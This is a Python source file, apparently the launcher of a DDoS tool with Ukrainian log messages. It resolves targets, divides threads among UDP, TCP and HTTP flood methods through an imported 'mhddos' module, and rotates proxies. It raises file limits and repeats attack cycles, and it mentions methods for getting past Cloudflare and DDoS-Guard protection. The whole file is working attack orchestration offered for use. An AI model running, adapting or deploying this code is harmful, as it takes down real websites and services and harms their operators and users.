import logging
import os
import queue
from collections import namedtuple
from concurrent.futures import Future
from concurrent.futures.thread import _WorkItem
from sys import platform
from threading import Thread, Event
from time import sleep, time

from yarl import URL

from cli import init_argparse
from core import logger, cl, UDP_THREADS, LOW_RPC
from dns_utils import resolve_host, get_resolvable_targets
from mhddos import main as mhddos_main
from output import AtomicCounter, show_statistic, print_banner
from proxies import update_proxies
from targets import Targets


# @formatter:off
if os.name == 'nt':
    import colorama; colorama.init()
# @formatter:on

Params = namedtuple('Params', 'url, ip, method, threads')


class DaemonThreadPool:
    def __init__(self, num_threads):
        self._queue = queue.SimpleQueue()
        for cnt in range(num_threads):
            try:
                Thread(target=self._worker, daemon=True).start()
            except RuntimeError:
                logger.warning(
                    f'{cl.RED}Не вдалося запустити усі {num_threads} потоків - максимум {cnt - 50}{cl.RESET}')
                exit()

    def submit(self, fn, /, *args, **kwargs):
        f = Future()
        w = _WorkItem(f, fn, args, kwargs)
        self._queue.put(w)
        return f

    def _worker(self):
        while True:
            work_item = self._queue.get(block=True)
            if work_item is not None:
                work_item.run()
                del work_item


def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        ip = resolve_host(target)
        target = URL(target)
        # UDP
        if target.scheme == 'udp':
            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))

        # TCP
        elif target.scheme == 'tcp':
            params_list.append(Params(target, ip, 'TCP', threads_per_target))

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append(Params(target, ip, method, threads))

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    statistics = {}
    event = Event()
    event.set()
    for params in params_list:
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            **params._asdict(),
            'proxy_fn': 'empty.txt' if vpn_mode else 'proxies.txt',
            'rpc': rpc,
            'sock_timeout': proxy_timeout,

            'thread_pool': thread_pool,
            'event': event,
            'statistics': thread_statistics,
        }
        mhddos_main(**kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
                % (params.url.host, params.method, params.threads))

    if not (table or debug):
        logger.info(f'{cl.GREEN}Атака запущена, новий цикл через {period} секунд{cl.RESET}')
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, ts, period, passed)
            sleep(refresh_rate)
    event.clear()


def check_fix_ulimits():
    if platform == 'linux':
        # Available on linux only
        import resource

        try:
            ulimit_threshold = 1048576
            ulimit = resource.getrlimit(resource.RLIMIT_NOFILE)
            logger.info(f'{cl.BLUE}Перевіряємо ліміти кількості відкритих файлів, (soft, hard)={ulimit}{cl.RESET}')

            if ulimit < (ulimit_threshold, ulimit_threshold):
                logger.warning(f'{cl.YELLOW}Ліміти замалі, пробуємо встановити вищі, (soft, hard)='
                               f'{(ulimit_threshold, ulimit_threshold)}{cl.RESET}')
                resource.setrlimit(resource.RLIMIT_NOFILE, (ulimit_threshold, ulimit_threshold))
                logger.info(f'{cl.BLUE}Встановлені нові ліміти кількості відкритих файлів, (soft, hard)='
                            f'{resource.getrlimit(resource.RLIMIT_NOFILE)}{cl.RESET}')
        except Exception as ex:
            logger.error(f'{cl.RED}Щось пішло не так: "{ex}"{cl.RESET}')
            logger.error(f'{cl.RED}Скоріше за все скрипт запущено не через sudo{cl.RESET}')
            logger.error(f'{cl.RED}Підніміть ліміти в цій консолі командою "ulimit -n 1048576"{cl.RESET}')


def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, debug, table):
    if table:
        debug = False
    if debug:
        logger.setLevel(logging.DEBUG)

    for bypass in ('CFB', 'DGB', 'BYPASS'):
        if bypass in http_methods:
            logger.warning(f'{cl.RED}Робота методу {bypass} не гарантована - атака методами за замовчуванням може бути ефективніша{cl.RESET}')

    thread_pool = DaemonThreadPool(total_threads)
    while True:
        targets = list(get_resolvable_targets(targets_iter))
        if not targets:
            logger.error(f'{cl.RED}Не знайдено жодної доступної цілі{cl.RESET}')
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перепідключень{cl.RESET}'
            )

        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
        if not no_proxies:
            update_proxies(thread_pool, period, targets, proxy_timeout)
        run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)


if __name__ == '__main__':
    check_fix_ulimits()

    args = init_argparse().parse_args()
    print_banner(args.vpn_mode)
    start(
        args.threads,
        args.period,
        Targets(args.targets, args.config),
        args.rpc,
        args.proxy_timeout,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
    )
